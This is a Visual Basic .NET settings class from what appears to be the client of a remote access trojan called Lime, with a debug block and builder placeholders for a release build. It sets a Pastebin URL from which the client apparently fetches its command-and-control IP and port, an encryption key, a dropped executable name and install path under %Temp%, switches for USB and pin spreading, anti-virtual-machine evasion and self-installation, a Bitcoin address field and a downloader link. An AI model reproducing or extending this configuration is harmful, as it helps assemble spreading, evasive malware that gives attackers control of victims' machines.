Namespace Lime

    Public Class C_Settings

        'For testing using VS run as debug

#If DEBUG Then
        Public Shared Pastebin As String = "https://pastebin.com/raw/DDTVwwbu" ' IP:PORT
        Public Shared HOST As String 'IP
        Public Shared PORT As Integer 'PORT
        Public Shared EncryptionKey As String = "NYANCAT" 'encryption/decryption key
        Public Shared ENDOF As String = "|'N'|" 'endof
        Public Shared SPL As String = "|'L'|" 'split data
        Public Shared EXE As String = "CLIENT.exe" 'client drop name
        Public Shared MTX As Threading.Mutex
        Public Shared USB As Boolean = False 'usb spread
        Public Shared PIN As Boolean = False 'pin spread
        Public Shared ANTI As Boolean = False 'anti virtual machines
        Public Shared DROP As Boolean = False 'drop and install client
        Public Shared PATH1 As String = "Temp" 'Main Folder
        Public Shared PATH2 As String = "\Lime\" 'Sub Folder
        Public Shared fullpath = Environ(PATH1) & PATH2 & EXE
        Public Shared BTC_ADDR As String = "THIS IS YOUR BTC 1234567890" 'Bitcoin address
        Public Shared DWN_CHK As Boolean = True 'downloader once
        Public Shared DWN_LINK As String = "" 'downloader link
        Public Shared Delay As Integer = "3" 'Delay AKA Sleep

#Else
        Public Shared Pastebin As String = "%Pastebin%"
        Public Shared HOST As String
        Public Shared PORT As Integer
        Public Shared EncryptionKey As String = "%PASS%"
        Public Shared ENDOF As String = "%KEY%"
        Public Shared SPL As String = "%SPL%"
        Public Shared EXE As String = "%EXE%"
        Public Shared MTX As Threading.Mutex
        Public Shared USB As Boolean = "%USB%"
        Public Shared PIN As Boolean = "%PIN%"
        Public Shared ANTI As Boolean = "%ANTI%"
        Public Shared DROP As Boolean = "%DROP%"
        Public Shared PATH1 As String = "%PATH1%"
        Public Shared PATH2 As String = "%PATH2%"
        Public Shared fullpath = Environ(PATH1) & PATH2 & EXE
        Public Shared BTC_ADDR As String = "%BTC_ADDR%"
        Public Shared DWN_CHK As Boolean = "%DWN_CHK%"
        Public Shared DWN_LINK As String = "%DWN_LINK%"
        Public Shared Delay As Integer = "%Delay%"
#End If

    End Class

End Namespace